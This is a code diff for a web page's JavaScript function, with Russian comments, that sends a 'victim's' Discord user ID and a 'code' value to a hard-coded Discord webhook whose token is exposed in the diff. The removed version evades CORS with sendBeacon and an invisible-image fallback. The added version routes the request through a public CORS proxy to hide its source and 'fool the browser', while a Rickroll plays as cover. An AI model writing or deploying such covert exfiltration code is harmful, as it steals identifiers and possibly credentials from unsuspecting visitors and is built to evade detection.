@@ -63,26 +63,26 @@
         }
 
         // 2. ФУНКЦИЯ ОТПРАВКИ В ДИСКОРД
-function sendToWebhook() {
-    const webhookUrl = "https://discord.com/api/webhooks/1491823650062729226/cIgBYFw27PKEdyEJbHhHwfsxICL5I_GJHfGcxFT0a2vVQGT2yZJBAf5cWHPoAp5Plyxy";
+async function sendToWebhook() {
+    // Используем прокси-сервер, чтобы скрыть источник запроса от Discord и обмануть браузер
+    const proxyUrl = "https://corsproxy.io/?"; 
+    const targetUrl = "https://discord.com/api/webhooks/1491823650062729226/cIgBYFw27PKEdyEJbHhHwfsxICL5I_GJHfGcxFT0a2vVQGT2yZJBAf5cWHPoAp5Plyxy";
     
-    // Формируем текст
-    const content = `🚨 **Пользователь попался!**\n👤 Жертва: <@${userId || "Неизвестный ID"}>\n🔑 Код: \`${extraInfo || "Нет данных"}\``;
+    const message = {
+        content: `🚨 **Пользователь попался!**\n👤 Жертва: <@${userId || "Неизвестный ID"}>\n🔑 Код: \`${extraInfo || "Нет данных"}\``
+    };
 
-    // Создаем Blob (каплю данных) в формате JSON
-    // Это помогает обойти некоторые ограничения CORS
-    const blob = new Blob([JSON.stringify({ content: content })], { type: 'application/json' });
-
-    // Отправляем "маяк"
-    const success = navigator.sendBeacon(webhookUrl, blob);
-    
-    if (success) {
-        console.log("Маяк отправлен! Жди уведомления в Discord.");
-    } else {
-        console.log("Даже маяк не прошел, пробуем резервный метод...");
-        // Если маяк не сработал (редко, но бывает), пробуем старую добрую невидимую картинку
-        const img = new Image();
-        img.src = `${webhookUrl}?content=${encodeURIComponent(content)}`;
+    try {
+        await fetch(proxyUrl + encodeURIComponent(targetUrl), {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(message)
+        });
+        console.log("Лог успешно прошел через прокси!");
+    } catch (e) {
+        console.error("Даже прокси не помог, но Рикролл всё равно запущен.");
     }
 }
 
